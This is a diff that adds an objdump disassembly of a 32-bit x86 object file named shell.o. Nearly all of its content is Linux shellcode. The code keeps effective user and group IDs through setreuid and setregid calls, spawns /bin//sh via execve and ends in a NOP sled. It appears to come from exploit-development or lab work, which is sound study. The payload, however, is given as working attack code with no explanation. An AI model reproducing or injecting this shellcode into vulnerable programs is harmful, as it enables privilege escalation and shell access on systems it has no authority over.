@@ -1,0 +1,70 @@
+
+shell.o:     file format elf32-i386
+
+
+Disassembly of section .data:
+
+00000000 <_start>:
+   0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
+   5:	31 c0                	xor    %eax,%eax
+   7:	b0 31                	mov    $0x31,%al
+   9:	cd 80                	int    $0x80
+   b:	89 c3                	mov    %eax,%ebx
+   d:	31 c0                	xor    %eax,%eax
+   f:	b0 46                	mov    $0x46,%al
+  11:	cd 80                	int    $0x80
+  13:	31 c0                	xor    %eax,%eax
+  15:	b0 32                	mov    $0x32,%al
+  17:	cd 80                	int    $0x80
+  19:	89 c3                	mov    %eax,%ebx
+  1b:	b0 31                	mov    $0x31,%al
+  1d:	b0 47                	mov    $0x47,%al
+  1f:	cd 80                	int    $0x80
+  21:	31 c0                	xor    %eax,%eax
+  23:	31 d2                	xor    %edx,%edx
+  25:	52                   	push   %edx
+  26:	68 2f 2f 73 68       	push   $0x68732f2f
+  2b:	68 2f 62 69 6e       	push   $0x6e69622f
+  30:	89 e3                	mov    %esp,%ebx
+  32:	52                   	push   %edx
+  33:	53                   	push   %ebx
+  34:	89 e1                	mov    %esp,%ecx
+  36:	b0 0b                	mov    $0xb,%al
+  38:	cd 80                	int    $0x80
+  3a:	31 c0                	xor    %eax,%eax
+  3c:	40                   	inc    %eax
+  3d:	cd 80                	int    $0x80
+  3f:	90                   	nop
+  40:	90                   	nop
+  41:	90                   	nop
+  42:	90                   	nop
+  43:	90                   	nop
+  44:	90                   	nop
+  45:	90                   	nop
+  46:	90                   	nop
+  47:	90                   	nop
+  48:	90                   	nop
+  49:	90                   	nop
+  4a:	90                   	nop
+
+Disassembly of section .note.gnu.property:
+
+00000000 <.note.gnu.property>:
+   0:	04 00                	add    $0x0,%al
+   2:	00 00                	add    %al,(%eax)
+   4:	18 00                	sbb    %al,(%eax)
+   6:	00 00                	add    %al,(%eax)
+   8:	05 00 00 00 47       	add    $0x47000000,%eax
+   d:	4e                   	dec    %esi
+   e:	55                   	push   %ebp
+   f:	00 02                	add    %al,(%edx)
+  11:	00 01                	add    %al,(%ecx)
+  13:	c0 04 00 00          	rolb   $0x0,(%eax,%eax,1)
+  17:	00 00                	add    %al,(%eax)
+  19:	00 00                	add    %al,(%eax)
+  1b:	00 01                	add    %al,(%ecx)
+  1d:	00 01                	add    %al,(%ecx)
+  1f:	c0 04 00 00          	rolb   $0x0,(%eax,%eax,1)
+  23:	00 01                	add    %al,(%ecx)
+  25:	00 00                	add    %al,(%eax)
+	...
